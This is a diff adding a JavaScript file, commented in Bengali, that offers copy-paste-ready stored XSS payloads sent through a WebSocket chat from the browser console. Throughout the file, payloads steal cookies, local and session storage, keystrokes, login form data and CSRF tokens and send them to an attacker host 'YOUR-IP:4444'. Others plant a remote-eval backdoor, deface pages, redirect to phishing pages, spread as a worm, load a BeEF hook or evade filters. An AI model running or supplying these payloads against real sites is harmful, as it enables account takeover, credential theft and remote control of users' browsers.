@@ -1,0 +1,135 @@
+// ============= F12 কনসোলের জন্য প্রস্তুত পেলোড (কপি-পেস্ট রেডি) =============
+
+// 1. কানেক্ট করার ফাংশন (সব পেলোডের জন্য必须先 রান করুন)
+const ws = new WebSocket('ws://target.com:8080');
+ws.onopen = () => console.log('✅ Connected');
+
+// ============= বেসিক ডিটেকশন পেলোড =============
+
+// 1.1 টেস্ট এলার্ট
+ws.send(JSON.stringify({user:'<img src=x onerror=alert(1)>', message:'test'}));
+
+// 1.2 কনসোল লগ টেস্ট
+ws.send(JSON.stringify({user:'<img src=x onerror=console.log("XSS")>', message:'test'}));
+
+// 1.3 ডম রাইট টেস্ট
+ws.send(JSON.stringify({user:'<img src=x onerror=document.write("HACKED")>', message:'test'}));
+
+// ============= কুকি চুরি পেলোড =============
+
+// 2.1 সিম্পল কুকি চুরি
+ws.send(JSON.stringify({user:'<img src=x onerror="fetch(\'http://YOUR-IP:4444?c=\'+document.cookie)">', message:'steal'}));
+
+// 2.2 সব কুকি একসাথে
+ws.send(JSON.stringify({user:'<img src=x onerror="fetch(\'http://YOUR-IP:4444/steal\',{method:\'POST\',body:document.cookie})">', message:'steal'}));
+
+// ============= লোকাল স্টোরেজ চুরি =============
+
+// 3.1 লোকাল স্টোরেজ
+ws.send(JSON.stringify({user:'<img src=x onerror="fetch(\'http://YOUR-IP:4444?ls=\'+JSON.stringify(localStorage))">', message:'steal'}));
+
+// 3.2 সেশন স্টোরেজ
+ws.send(JSON.stringify({user:'<img src=x onerror="fetch(\'http://YOUR-IP:4444?ss=\'+JSON.stringify(sessionStorage))">', message:'steal'}));
+
+// ============= কী-লগার পেলোড =============
+
+// 4.1 সিম্পল কী-লগার
+ws.send(JSON.stringify({user:'<img src=x onerror="let k=\'\';document.onkeypress=e=>{k+=e.key;if(k.length>10){fetch(\'http://YOUR-IP:4444?k=\'+k);k=\'\'}}">', message:'keylog'}));
+
+// 4.2 অ্যাডভান্সড কী-লগার (ফর্ম ইনপুট সহ)
+ws.send(JSON.stringify({user:'<img src=x onerror="let keys=[];document.onkeypress=e=>{keys.push(e.key);fetch(\'http://YOUR-IP:4444/keylog\',{method:\'POST\',body:JSON.stringify({keys,url:location.href})})}">', message:'keylog'}));
+
+// ============= ফর্ম হাইজ্যাকিং =============
+
+// 5.1 সব ফর্ম হাইজ্যাক
+ws.send(JSON.stringify({user:'<img src=x onerror="document.querySelectorAll(\'form\').forEach(f=>{f.addEventListener(\'submit\',e=>{let d=new FormData(f);fetch(\'http://YOUR-IP:4444/form\',{method:\'POST\',body:JSON.stringify([...d])})})})">', message:'hijack'}));
+
+// 5.2 লগইন ফর্ম স্পেসিফিক
+ws.send(JSON.stringify({user:'<img src=x onerror="let f=document.querySelector(\'form[action*=\\\'login\\\']\');if(f){f.addEventListener(\'submit\',e=>{fetch(\'http://YOUR-IP:4444/creds\',{method:\'POST\',body:new FormData(f)})})}">', message:'hijack'}));
+
+// ============= পার্মানেন্ট ব্যাকডোর =============
+
+// 6.1 সেটইন্টারভাল ব্যাকডোর
+ws.send(JSON.stringify({user:'<img src=x onerror="setInterval(()=>{fetch(\'http://YOUR-IP:4444/cmd\').then(r=>r.text()).then(eval)},5000)">', message:'backdoor'}));
+
+// 6.2 ওয়েবসকেট ব্যাকডোর
+ws.send(JSON.stringify({user:'<img src=x onerror="let ws2=new WebSocket(\'ws://YOUR-IP:4444\');ws2.onmessage=e=>eval(e.data)">', message:'backdoor'}));
+
+// ============= পেজ ডিফেসমেন্ট =============
+
+// 7.1 সিম্পল ডিফেস
+ws.send(JSON.stringify({user:'<img src=x onerror="document.body.innerHTML=\'<h1 style=color:red>HACKED</h1>\'">', message:'deface'}));
+
+// 7.2 অ্যাডভান্সড ডিফেস (কাস্টম CSS)
+ws.send(JSON.stringify({user:'<img src=x onerror="document.body.innerHTML=\'<div style=text-align:center;margin-top:200px><h1>🔴 HACKED BY XSS 🔴</h1><p>WebSocket Vulnerability</p></div>\'">', message:'deface'}));
+
+// ============= রিডাইরেক্ট পেলোড =============
+
+// 8.1 ফিশিং পেজে রিডাইরেক্ট
+ws.send(JSON.stringify({user:'<img src=x onerror="window.location=\'http://YOUR-IP:4444/phishing.html\'">', message:'redirect'}));
+
+// 8.2 ডিলে রিডাইরেক্ট
+ws.send(JSON.stringify({user:'<img src=x onerror="setTimeout(()=>{window.location=\'http://YOUR-IP:4444/phishing.html\'},3000)">', message:'redirect'}));
+
+// ============= স্ক্রিনশট (DOM স্টিল) =============
+
+// 9.1 পেজ HTML চুরি
+ws.send(JSON.stringify({user:'<img src=x onerror="fetch(\'http://YOUR-IP:4444/page\',{method:\'POST\',body:btoa(document.documentElement.outerHTML)})">', message:'steal'}));
+
+// 9.2 ভিজিবল স্ক্রিনশট (html2canvas)
+ws.send(JSON.stringify({user:'<img src=x onerror="let s=document.createElement(\'script\');s.src=\'https://html2canvas.hertzen.com/dist/html2canvas.min.js\';s.onload=()=>{html2canvas(document.body).then(c=>{fetch(\'http://YOUR-IP:4444/screenshot\',{method:\'POST\',body:c.toDataURL()})})};document.head.appendChild(s)">', message:'screenshot'}));
+
+// ============= CSRF টোকেন চুরি =============
+
+// 10.1 মেটা ট্যাগ থেকে CSRF
+ws.send(JSON.stringify({user:'<img src=x onerror="let t=document.querySelector(\'meta[name=csrf-token]\');if(t)fetch(\'http://YOUR-IP:4444?csrf=\'+t.content)">', message:'csrf'}));
+
+// 10.2 ফর্ম থেকে CSRF
+ws.send(JSON.stringify({user:'<img src=x onerror="let i=document.querySelector(\'input[name=csrf_token]\');if(i)fetch(\'http://YOUR-IP:4444?csrf=\'+i.value)">', message:'csrf'}));
+
+// ============= সেলফ-রেপ্লিকেটিং ওয়ার্ম =============
+
+// 11.1 ওয়ার্ম পেলোড (নিজেই কপি করে)
+let worm = `<img src=x onerror="let ws=new WebSocket('ws://localhost:8080');ws.onopen=()=>{ws.send(JSON.stringify({user:document.currentScript.outerHTML,message:'worm'}))};fetch('http://YOUR-IP:4444?worm=spread')">`;
+ws.send(JSON.stringify({user:worm, message:'worm'}));
+
+// ============= বিটিডব্লিউ (BeEF) হুক =============
+
+// 12.1 BeEF হুক
+ws.send(JSON.stringify({user:'<img src=x onerror="var s=document.createElement(\'script\');s.src=\'http://YOUR-IP:3000/hook.js\';document.body.appendChild(s)">', message:'beef'}));
+
+// ============= ক্রিপ্টো মাইনার (CPU হাইজ্যাক) =============
+
+// 13.1 কোইন্ড মাইনার
+ws.send(JSON.stringify({user:'<img src=x onerror="setInterval(()=>{for(let i=0;i<1000000;i++)Math.random()},100)">', message:'miner'}));
+
+// ============= অল-ইন-ওয়ান মেগা পেলোড =============
+
+// 14.1 সবকিছু একসাথে
+ws.send(JSON.stringify({user:`<img src=x onerror="
+    fetch('http://YOUR-IP:4444?c='+document.cookie);
+    fetch('http://YOUR-IP:4444?ls='+JSON.stringify(localStorage));
+    let keys='';document.onkeypress=e=>{keys+=e.key;if(keys.length>10){fetch('http://YOUR-IP:4444?k='+keys);keys=''}};
+    setInterval(()=>{fetch('http://YOUR-IP:4444/cmd').then(r=>r.text()).then(eval)},5000);
+    document.body.innerHTML='<h1 style=color:red>HACKED</h1>';
+">`, message:'mega'}));
+
+// ============= WAF বাইপাস পেলোড =============
+
+// 15.1 ইভেন্ট হ্যান্ডলার বিভিন্ন
+ws.send(JSON.stringify({user:'<svg onload=alert(1)>', message:'test'}));
+ws.send(JSON.stringify({user:'<body onload=alert(1)>', message:'test'}));
+ws.send(JSON.stringify({user:'<details open ontoggle=alert(1)>', message:'test'}));
+ws.send(JSON.stringify({user:'<input onfocus=alert(1) autofocus>', message:'test'}));
+
+// 15.2 এনকোডিং বাইপাস
+ws.send(JSON.stringify({user:'%3Cscript%3Ealert(1)%3C/script%3E', message:'test'}));
+ws.send(JSON.stringify({user:'\\u003cscript\\u003ealert(1)\\u003c/script\\u003e', message:'test'}));
+
+// ============= এক লাইনে কুইক টেস্ট =============
+
+// 16.1 সবচেয়ে সিম্পল টেস্ট
+new WebSocket('ws://target.com:8080').onopen = e => e.target.send(JSON.stringify({user:'<img src=x onerror=alert(1)>', message:'test'}));
+
+// 16.2 কুকি চুরি এক লাইনে
+new WebSocket('ws://target.com:8080').onopen = e => e.target.send(JSON.stringify({user:'<img src=x onerror="fetch(\'http://YOUR-IP:4444?c=\'+document.cookie)">', message:'steal'}));
